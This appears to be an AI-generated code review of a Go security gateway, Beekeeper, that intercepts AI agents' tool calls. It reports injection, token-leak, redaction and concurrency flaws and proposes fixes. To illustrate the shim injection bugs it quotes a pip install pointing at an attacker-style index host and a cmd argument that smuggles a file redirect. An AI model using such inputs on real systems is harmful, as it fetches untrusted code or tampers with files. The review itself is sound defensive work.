---
phase: 04-integration-surfaces
reviewed: 2026-05-27T00:00:00Z
depth: standard
files_reviewed: 23
files_reviewed_list:
  - internal/hooks/hooks.go
  - internal/hooks/claude_code.go
  - internal/hooks/cursor.go
  - internal/hooks/codex.go
  - internal/hooks/gateway_targets.go
  - internal/hooks/hooks_test.go
  - internal/gateway/gateway.go
  - internal/gateway/proxy.go
  - internal/gateway/parser.go
  - internal/gateway/policy.go
  - internal/gateway/state.go
  - internal/gateway/gateway_test.go
  - internal/gateway/proxy_test.go
  - internal/shim/shim.go
  - internal/shim/shim_unix.go
  - internal/shim/shim_windows.go
  - internal/shim/shim_test.go
  - internal/policy/types.go
  - internal/policy/engine.go
  - internal/audit/types.go
  - internal/audit/redact.go
  - internal/check/handler.go
  - internal/config/config.go
  - cmd/beekeeper/main.go
findings:
  critical: 7
  warning: 8
  info: 3
  total: 18
status: issues_found
---

# Phase 4: Code Review Report

**Reviewed:** 2026-05-27T00:00:00Z
**Depth:** standard
**Files Reviewed:** 23 (plus `internal/policy/corroboration.go` cross-referenced)
**Status:** issues_found

## Summary

The Phase 4 integration surfaces cover four major subsystems: the hook installer (`internal/hooks`), the MCP gateway proxy (`internal/gateway`), the PATH shim layer (`internal/shim`), and supporting infrastructure in `internal/policy`, `internal/audit`, `internal/check`, and `internal/config`. The architecture is generally sound, and several security properties are well-implemented: gateway token auth uses constant-time comparison, the gateway binds to `127.0.0.1` by default, state files are written with `0o600` permissions, and the parser enforces body/method/depth bounds.

However, several serious issues were found, including two correctness bugs that can silently suppress the policy decision (a dead `evalCtx` in the gateway handler and an `Authorization` header forwarded to the upstream), a shell injection vector in the Unix shim that fires on arguments containing spaces or shell metacharacters, the `Config.FailOpen` field being accepted but never consulted in the gateway handler's error paths (making the flag a no-op), and audit redaction that is not applied in the gateway `writeAudit` path. The `writeFileAtomic` helper in `hooks.go` leaves a fixed-name temp file on disk that is world-readable before the rename.

---

## Critical Issues

### CR-01: `evalCtx` is created but `applyPolicy` runs with the *original* request context — timeout is never enforced

**File:** `internal/gateway/proxy.go:136-144`

**Issue:** A `context.WithTimeout(r.Context(), 500*time.Millisecond)` context (`evalCtx`) is created but is never passed to `applyPolicy`. The call at line 140 is:

```go
decision := applyPolicy(msg, h.idx, ac)
```

`applyPolicy` calls `policy.Evaluate`, which is a pure function and does not accept a context. The `evalCtx.Err()` check at line 143 evaluates the context *after* `applyPolicy` has already returned; if policy evaluation blocks the goroutine for longer than 500ms, there is no mechanism to interrupt it. The `evalCtx` check after a synchronous return is only meaningful if `applyPolicy` were itself context-aware.

Result: The 500ms deadline comment is misleading and the protection it claims to provide does not exist. A slow or blocked `LookupAll` call (e.g., if a catalog adapter hangs) will block the gateway handler goroutine past the deadline without producing a fail-closed response.

**Fix:** Either: (a) make `applyPolicy` accept and propagate a `context.Context` to any blocking catalog lookup, then use `evalCtx`; or (b) run `applyPolicy` in a separate goroutine and use a `select` to race the result against `evalCtx.Done()`:

```go
type policyResult struct {
    d   policy.Decision
    err error
}
ch := make(chan policyResult, 1)
go func() {
    ch <- policyResult{d: applyPolicy(msg, h.idx, ac)}
}()
select {
case res := <-ch:
    decision = res.d
case <-evalCtx.Done():
    writeJSONRPCError(w, msg.ID, -32002, "policy timeout (fail-closed)", nil)
    return
}
```

---

### CR-02: Authorization header forwarded verbatim to upstream — Beekeeper's own session token leaks to the upstream MCP server

**File:** `internal/gateway/proxy.go:189-194`

**Issue:** `forwardWithWarningInjection` copies *all* request headers from the incoming request to the upstream request, including the `Authorization: Bearer <gateway-token>` header:

```go
for k, vv := range r.Header {
    for _, v := range vv {
        req.Header.Add(k, v)
    }
}
```

The Beekeeper gateway session token — a 256-bit random secret — is now sent to the upstream MCP server verbatim. The upstream (e.g., a Cursor or Claude Code MCP server) receives a credential it did not issue and should not see. If the upstream logs headers (common), the token is exposed in logs outside Beekeeper's control.

This is also inconsistent with the ReverseProxy path (allow/non-tool-call), which uses `httputil.ReverseProxy.Rewrite` and calls `pr.SetXForwarded()`. The manual path for "warn" silently diverges.

**Fix:** Strip the `Authorization` header from the forwarded request. If the upstream requires its own credential, it should be configured separately in `Config.UpstreamURL` or a dedicated upstream-auth flag. At minimum, never forward the Beekeeper gateway token:

```go
for k, vv := range r.Header {
    if strings.EqualFold(k, "Authorization") {
        continue // never forward Beekeeper's own gateway token to upstream
    }
    for _, v := range vv {
        req.Header.Add(k, v)
    }
}
```

---

### CR-03: Unix shim generates a heredoc with `$*` un-quoted — shell injection via tool arguments

**File:** `internal/shim/shim_unix.go:29-31`

**Issue:** The generated shell script passes arguments through `$*` inside a double-quoted JSON string literal:

```sh
beekeeper check <<EOF
{"tool_name":"Bash","tool_input":{"command":"%s $*"}}
EOF
```

When the shim is invoked with arguments that contain spaces, double-quotes, backslashes, or JSON-special characters (e.g., `npm install "foo bar"` or `pip install pkg --index-url 'http://evil.example.com'`), the generated heredoc body becomes malformed JSON. The shell interpolates `$*` into the heredoc *before* `beekeeper check` reads it, producing either a parse error (which `beekeeper check` will treat as fail-closed, a block) or, more dangerously, injecting characters that restructure the JSON.

An attacker who controls the package name or install arguments can craft input to produce `{"tool_name":"Bash","tool_input":{"command":"legitimate"}}` followed by additional JSON content that overrides the tool_name field in a loose parser. While the current policy engine parses with `json.Unmarshal` (no duplicate key override), the heredoc still passes arbitrary agent-controlled bytes into a JSON string without escaping, which breaks on `"` or `\` characters.

Additionally, `$*` splits on spaces (IFS) rather than preserving quoted arguments, so multi-word package names are broken.

**Fix:** Use a proper argument serialization approach. The cleanest fix is to use `printf '%s\n' "$@"` piped through a helper, or to JSON-encode arguments before writing to the heredoc. The safest approach for a POSIX shim is to use a small inline Python/jq call or, better, have `beekeeper check` accept the tool name and arguments as separate command-line flags so shell quoting is handled by the OS:

```sh
# Pass args as positional parameters to avoid heredoc injection:
printf '{"tool_name":"Bash","tool_input":{"command":"%s"}}' \
    "$(printf '%s ' "$@" | sed 's/"/\\"/g')" | beekeeper check
```

A more robust fix is to restructure `beekeeper check` to accept `--tool` and `--args` flags rather than JSON stdin when invoked from shims.

---

### CR-04: Windows shim injects `%*` into a JSON string literal without escaping — structured data corruption

**File:** `internal/shim/shim_windows.go:31-38`

**Issue:** The Windows `.cmd` shim uses `echo` with `%*` directly inside a JSON string:

```cmd
echo {"tool_name":"Bash","tool_input":{"command":"%s %%*"}} | beekeeper check
```

`%%*` expands to `%*` in a batch file, which at runtime expands to all arguments. If any argument contains `"`, `|`, `>`, `<`, or `&`, the `echo` command will produce malformed JSON or trigger command injection (the `|` and `>` are shell operators in `cmd.exe` even inside `echo` output). For example, `npm install pkg>C:\evil` would write to a file rather than pipe to `beekeeper check`.

This is a functional correctness bug (broken JSON on any package containing spaces) that also creates a command injection vector via `>`, `<`, `|`, `&`, and `"` in package names.

**Fix:** Use a PowerShell invocation or a Go-based executable shim instead of a batch file. If batch is retained, arguments must go through `cmd.exe` delayed expansion with `!VARNAME!` and quotes, but cmd.exe's quoting model for `echo` is insufficient for arbitrary JSON. The correct fix for Windows is to use a pre-compiled `.exe` shim that constructs the JSON in Go code with proper `json.Marshal`, avoiding the shell entirely.

---

### CR-05: `writeFileAtomic` in `hooks.go` uses a fixed temp file name — concurrent installs or crashes leave a world-readable temp file

**File:** `internal/hooks/hooks.go:152-158`

**Issue:** `writeFileAtomic` writes to `path + ".beekeeper-tmp"` — a fixed, predictable name — before renaming over the target:

```go
func writeFileAtomic(path string, data []byte) error {
    tmp := path + ".beekeeper-tmp"
    if err := os.WriteFile(tmp, data, 0o644); err != nil {
        return err
    }
    return os.Rename(tmp, path)
}
```

Two problems:

1. **Race condition:** If `writeFileAtomic` is called concurrently (e.g., two parallel `beekeeper hooks install` invocations), both write to the same `.beekeeper-tmp` file, and one will silently overwrite the other's data before either renames. The result written to the final path is non-deterministic.

2. **No cleanup on failure:** If `os.WriteFile` succeeds but `os.Rename` fails, the temp file is left on disk with mode `0o644` containing the partial/complete new content. On a multi-user system, this leaks the settings file content to other users who can read `~/.claude/settings.json.beekeeper-tmp`.

3. **Mode mismatch:** The temp file is created with `0o644` (same as the final file), but there is no intermediate protection. Unlike `writeStateFileAtomic` in `gateway/state.go` which uses `os.CreateTemp` and `Chmod(0o600)`, this function lacks the same rigor.

**Fix:** Use `os.CreateTemp` in the same directory (to guarantee atomic rename across filesystems) with a deferred remove:

```go
func writeFileAtomic(path string, data []byte) error {
    dir := filepath.Dir(path)
    tmp, err := os.CreateTemp(dir, filepath.Base(path)+".tmp-*")
    if err != nil {
        return err
    }
    tmpName := tmp.Name()
    defer os.Remove(tmpName) // no-op if rename succeeded
    if _, err := tmp.Write(data); err != nil {
        tmp.Close()
        return err
    }
    if err := tmp.Close(); err != nil {
        return err
    }
    return os.Rename(tmpName, path)
}
```

---

### CR-06: Gateway `writeAudit` does not apply redaction — credentials in policy reasons are written to disk in plaintext

**File:** `internal/gateway/proxy.go:263-284`

**Issue:** The gateway's `writeAudit` method constructs and writes an `AuditRecord` without calling `audit.RedactRecord`. The `check` handler (`internal/check/handler.go:334-335`) correctly applies `audit.DefaultRedactPatterns()` before writing. The gateway handler does not:

```go
func (h *gatewayHandler) writeAudit(tc policy.ToolCall, d policy.Decision) {
    // ...
    rec := audit.FromDecision(tc, d, recordID, time.Now().UTC().Format(time.RFC3339), policy.AgentContext{})
    rec.Endpoint = "gateway"
    if err := aw.Write(rec); err != nil { // <-- written without redaction
        // ...
    }
}
```

If the `decision.Reason` field contains credential snippets (which can happen when the policy engine formats error messages containing tool input substrings, or when a malicious tool call injects a Bearer token string into the command argument), those credentials are persisted to the audit log unredacted when the gateway path is used.

This is a direct contradiction of the redaction requirement stated in `internal/audit/redact.go` ("applied before every audit record is written to disk") and `internal/check/handler.go` (comment at line 320: "T-04-05-02").

**Fix:** Apply redaction in `writeAudit` the same way `writeAuditWithAC` does:

```go
patterns := audit.DefaultRedactPatterns()
rec = audit.RedactRecord(rec, patterns)
if err := aw.Write(rec); err != nil {
    // ...
}
```

---

### CR-07: `gateway.Config.FailOpen` field is set and documented but never consulted — fail-closed behavior is unconditional in the gateway

**File:** `internal/gateway/policy.go:45-47`, `internal/gateway/proxy.go:125-172`, `cmd/beekeeper/main.go:865`

**Issue:** `Config.FailOpen` is defined, documented, and wired in `main.go`:

```go
FailOpen: !cfg.FailClosed(),   // cmd/beekeeper/main.go:865
```

But `handleToolCall` and `applyPolicy` never read `cfg.FailOpen`. The panic recover (line 131), the policy timeout path (line 144), and the malformed params path in `applyPolicy` all hardcode `"block"` / `-32002` responses, ignoring the configured fail mode entirely.

This creates a behavioral inconsistency: a user who explicitly sets `fail_mode: "open"` in `config.json` gets fail-closed behavior from the gateway while the `beekeeper check` hook handler correctly honors fail-open. Operators relying on `fail_mode: "open"` for graceful degradation will be silently blocked by the gateway.

While fail-closed is the correct default, deliberately ignoring an explicitly configured `fail_open` setting without documenting this as intentional is a correctness bug. The `FailOpen` field in `Config` becomes a dead field.

**Fix:** Either (a) remove `FailOpen` from `Config` and document "the gateway is always fail-closed regardless of config" as an intentional stricter security policy; or (b) honor `cfg.FailOpen` in the panic/timeout error paths, consistent with how `failDecision(cfg, ...)` works in `check/handler.go`:

```go
if h.cfg.FailOpen {
    // Allow on failure but surface warning.
    writeJSONRPCError(w, msg.ID, -32002, "policy error (fail-open: reduced security)", nil)
    // ... forward to upstream
} else {
    writeJSONRPCError(w, msg.ID, -32002, "internal error (fail-closed)", nil)
}
```

---

## Warnings

### WR-01: `uninstallClaudeCode` uses `json.Unmarshal` on a file that may contain JSONC — will fail if the file has comments

**File:** `internal/hooks/claude_code.go:69-81`

**Issue:** `installClaudeCode` correctly uses `editorinit.PatchSettings` which is described as "JSONC-safe (strips comments on read)". But `uninstallClaudeCode` reads the file with `os.ReadFile` and parses it with `json.Unmarshal`:

```go
data, err := os.ReadFile(settingsPath)
// ...
var settings map[string]any
if err := json.Unmarshal(data, &settings); err != nil {
    return fmt.Errorf("uninstall claude-code: parse %q: %w", settingsPath, err)
}
```

`encoding/json` does not tolerate JSONC comments. If the user's `~/.claude/settings.json` contains comments (which is legal in JSONC and Claude Code's format), `uninstallClaudeCode` returns an error and fails to uninstall, even though `installClaudeCode` would succeed on the same file.

**Fix:** Use the same JSONC-safe reader used by `PatchSettings`. Expose `editorinit.ReadSettings(path)` (or equivalent) and use it in `uninstallClaudeCode`:

```go
settings, err := editorinit.ReadSettings(settingsPath)
if err != nil {
    return fmt.Errorf("uninstall claude-code: parse %q: %w", settingsPath, err)
}
```

---

### WR-02: `forwardWithWarningInjection` constructs the upstream URL by naive string concatenation — double-slash or path injection possible

**File:** `internal/gateway/proxy.go:182`

**Issue:**

```go
upstreamURL := h.cfg.UpstreamURL + r.URL.Path
```

If `h.cfg.UpstreamURL` is `"http://localhost:3000"` and `r.URL.Path` is `"/mcp"`, this produces `"http://localhost:3000/mcp"` — correct. But if `UpstreamURL` has a trailing slash (`"http://localhost:3000/"`) the result is `"http://localhost:3000//mcp"` — a double slash that some servers treat as a different path.

More importantly, `r.URL.Path` is the *decoded* path from the incoming request. If a client sends `/mcp/../../../etc/passwd`, Go's HTTP server normalizes this, but it is still possible for a malicious or buggy MCP client to send a path that, when concatenated, points to an unexpected upstream endpoint. Using `url.JoinPath` or explicit `net/url` manipulation is safer.

This path is also not appended when the `ReverseProxy` is used (lines 113, 170-171), which uses `pr.SetURL(upstream)` and replaces the path entirely. The warn path diverges silently.

**Fix:** Use `url.JoinPath` or `net/url` to build the upstream URL:

```go
base, err := url.Parse(h.cfg.UpstreamURL)
if err != nil { /* fail-closed */ }
upstreamURL := base.JoinPath(r.URL.Path).String()
```

---

### WR-03: `handleToolCall` timeout context (`evalCtx`) is created with `r.Context()` as parent — parent context cancellation before timeout fires produces misleading error message

**File:** `internal/gateway/proxy.go:136`

**Issue:** The `evalCtx` timeout is derived from `r.Context()`. If the HTTP client disconnects (cancelling `r.Context()`) before the 500ms policy timeout, `evalCtx.Err()` at line 143 returns `context.Canceled` (parent cancelled) rather than `context.DeadlineExceeded`. The code does not distinguish these cases. The error message "policy timeout (fail-closed)" is emitted for *both* client disconnects and genuine policy timeouts, polluting logs with misleading diagnostics.

**Fix:** Check `context.Cause(evalCtx)` or compare `evalCtx.Err()` to `context.DeadlineExceeded` vs `context.Canceled` and log accordingly. This does not change the fail-closed behavior but improves log signal-to-noise ratio.

---

### WR-04: `corroborate` returns `"warn"` when `WarnAt == 0` even on zero signed sources — unsigned-only always warns with default thresholds

**File:** `internal/policy/corroboration.go:81`

**Issue:** The escalation table reads:

```go
case signedCount >= t.WarnAt || hasUnsigned:
    return "warn", false, signedCount, agreedList, nil
```

With `DefaultCorroborationThresholds()` (WarnAt=1, BlockAt=2, QuarantineAt=3), `signedCount >= 1` is required for warn via the left branch. However, `hasUnsigned` (right branch) can trigger "warn" with *zero* signed sources. This is the intended behavior per the spec ("Unsigned sources → warn-only weight").

The bug is if a caller passes `CorroborationThresholds{WarnAt: 0, BlockAt: 0, QuarantineAt: 0}`: `validateCorroborationThresholds` allows this (0 <= 0 <= 0 passes), and `signedCount >= 0` is always true, so even an empty `matches` slice (which is checked earlier at line 47, returning "allow") would — if it reached the switch — return "warn". More concretely: if any catalog adapter returns a single *unsigned* match, the result is "warn" even though the policy operator may have intended 0 as "never warn". There is no way to configure "block unsigned matches" without raising `WarnAt` above the signed count.

This is a logic gap in the threshold validation: `WarnAt == 0` creates an always-warn condition for any unsigned source match, which is undocumented and not validated.

**Fix:** Add a lower bound check in `validateCorroborationThresholds`:

```go
if t.WarnAt < 1 {
    return fmt.Errorf("corroboration: WarnAt must be >= 1 (got %d)", t.WarnAt)
}
```

---

### WR-05: `DefaultRedactPatterns` recompiles regexps on every call — called per audit write in the hot path

**File:** `internal/audit/redact.go:40-62`, `internal/check/handler.go:334`

**Issue:** `DefaultRedactPatterns()` calls `regexp.MustCompile` three times on every invocation. It is called from `writeAuditWithAC` on every tool call evaluation, meaning every hook invocation re-compiles three regexes. The comment at line 332 acknowledges this:

```go
// defaultRedactPatterns() is called each invocation; patterns are compiled once
// per call (fast: regexp.MustCompile with a fixed set). A future optimization
// could cache them in a package-level var, but correctness takes precedence here.
```

While `regexp.MustCompile` is fast (microseconds), calling it on every hook invocation adds unnecessary overhead and masks the fact that the function's own docstring (line 12) says "pre-compiled once" — a misleading claim since they are recompiled on each call.

More critically: if `writeAudit` in the gateway is fixed to apply redaction (CR-06), the gateway path will also call `DefaultRedactPatterns()` per request. Under load, this degrades performance.

**Fix:** Use a `sync.Once` or package-level `var` to compile patterns once:

```go
var defaultPatterns = sync.OnceValue(func() []redactPattern {
    return []redactPattern{
        {regex: regexp.MustCompile(`(?i)Authorization:\s*Bearer\s+\S+`), replacement: "Authorization: Bearer [REDACTED]"},
        // ...
    }
})
```

---

### WR-06: `backupSettings` in `hooks.go` uses `0o644` for backup files — backup files of sensitive settings are world-readable

**File:** `internal/hooks/hooks.go:144`

**Issue:**

```go
if err := os.WriteFile(backupPath, data, 0o644); err != nil {
```

The backup files (`~/.claude/settings.json.beekeeper-backup-<timestamp>`) are written with `0o644` (world-readable). The settings file may contain tokens, session credentials, or sensitive editor configuration. On a multi-user system (or a shared developer machine), other users can read backup files.

The original file's permissions (which may be `0o600`) are not preserved.

**Fix:** Write backup files with `0o600`:

```go
if err := os.WriteFile(backupPath, data, 0o600); err != nil {
```

---

### WR-07: `parseAsBatch` silently discards all batch items except the first — clients sending batch requests receive responses only for item[0]

**File:** `internal/gateway/parser.go:109-122`

**Issue:**

```go
// Return first item; gateway handles full batch fan-out at the proxy level.
return parseSingle(batch[0])
```

The comment promises "gateway handles full batch fan-out at the proxy level" but no fan-out is implemented. The gateway dispatches on the single returned message. Clients sending a batch of JSON-RPC requests (allowed by the JSON-RPC 2.0 spec and enabled by `maxBatchItems`) will see only item[0] processed; the remaining items are silently dropped.

This is an incorrect implementation of JSON-RPC batch semantics. A client that sends `[req1, req2, req3]` receives a response for `req1` only, with no indication that `req2` and `req3` were dropped. The client may block waiting for responses that never arrive.

**Fix:** Either: (a) return a JSON-RPC error for batch requests ("batch not supported") rather than silently dropping items; or (b) implement actual fan-out. Option (a) is correct and easy:

```go
if len(batch) > 1 {
    // Inform caller that full batch fan-out is not yet implemented.
    return JSONRPCMessage{}, &ParseError{Code: -32600, Msg: "batch requests are not supported by this gateway"}
}
```

---

### WR-08: `BEEKEEPER_AGENT_LINEAGE` is split on commas without trimming whitespace — malformed lineage silently accepted

**File:** `internal/check/handler.go:231-233`

**Issue:**

```go
if l := os.Getenv("BEEKEEPER_AGENT_LINEAGE"); l != "" {
    lineage = strings.Split(l, ",")
}
```

`strings.Split` does not trim whitespace around the comma separator. If the env var is set as `"root, mid, child"` (with spaces), the lineage slice becomes `["root", " mid", " child"]` — entries with leading spaces that will not match any agent ID in audit records or policy comparisons. The error is silent and produces confusing audit trail entries.

**Fix:** Trim each element after splitting:

```go
for i, entry := range lineage {
    lineage[i] = strings.TrimSpace(entry)
}
// Remove empty entries that result from trailing commas.
lineage = slices.DeleteFunc(lineage, func(s string) bool { return s == "" })
```

---

## Info

### IN-01: `finalize` (deprecated) is retained alongside `finalizeWithAC` — dead code with misleading deprecation comment

**File:** `internal/check/handler.go:280-282`

**Issue:** `finalize` is marked "Deprecated: prefer `finalizeWithAC`" and its only body is `return finalizeWithAC(...)`. There are no callers of `finalize` in the reviewed files. Keeping a deprecated wrapper with no callers adds noise. If a future caller uses `finalize` by accident, the zero `AgentContext{}` silently suppresses lineage in the audit record.

**Fix:** Remove `finalize`. All callers use `finalizeWithAC`.

---

### IN-02: `config.Config.GetRedactPatterns()` returns custom patterns but they are never compiled or applied — forward-compatibility comment is misleading

**File:** `internal/config/config.go:160-167`

**Issue:** The comment states "custom patterns are returned for forward compatibility but are not yet compiled or applied in the Phase 4 implementation." The field exists in the JSON schema and users may set it, but it has zero effect. A user who configures `redact_patterns: ["my-secret-prefix-[A-Z]+"]` will believe their pattern is active and be surprised when their custom secrets appear in audit logs unredacted.

**Fix:** Add a startup warning when `cfg.RedactPatterns` is non-empty, or remove the field entirely until it is implemented. At minimum, the gateway and check handler should log a warning:

```go
if len(cfg.RedactPatterns) > 0 {
    fmt.Fprintf(os.Stderr, "beekeeper: warning: redact_patterns configured but not yet applied (Phase 6 feature)\n")
}
```

---

### IN-03: `gateway status` uses `syscall.Signal(0)` to probe process liveness — does not work on Windows

**File:** `cmd/beekeeper/main.go:930`

**Issue:**

```go
if signalErr := proc.Signal(syscall.Signal(0)); signalErr == nil {
    running = true
}
```

`Signal(0)` is a POSIX convention that sends no signal but checks whether the process exists. On Windows, `proc.Signal` always returns an error for any signal value; `Signal(0)` is not supported. The `gateway status` command will always report "not running" on Windows regardless of the actual gateway state.

The project's primary dev machine is Windows (CLAUDE.md), making this a functional defect on the primary platform.

**Fix:** Use platform-specific liveness detection. On Windows, use `windows.OpenProcess` with `PROCESS_QUERY_INFORMATION` and check the exit code:

```go
// +build windows
func isProcessAlive(pid int) bool {
    handle, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(pid))
    if err != nil { return false }
    defer windows.CloseHandle(handle)
    var code uint32
    windows.GetExitCodeProcess(handle, &code)
    return code == 259 // STILL_ACTIVE
}
```

Alternatively, use the `github.com/shirou/gopsutil/process` package already referenced in other Go safety tools.

---

_Reviewed: 2026-05-27T00:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
